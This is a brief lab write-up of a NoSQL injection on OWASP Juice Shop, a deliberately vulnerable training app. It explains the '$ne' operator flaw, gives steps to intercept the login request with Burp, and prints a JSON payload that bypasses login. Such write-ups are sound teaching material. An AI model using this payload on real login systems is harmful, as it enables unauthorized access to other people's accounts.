# NoSQL Injection - Juice Shop

## Vulnerability (1 sentence)
MongoDB treats `$ne` as an operator, making the query always true.

## Steps to Reproduce
1. Go to login page
2. Intercept request with Burp
3. Change email to `{"$ne": null}`

## Payload
```json
{"email":{"$ne": null}, "password": "anything"}
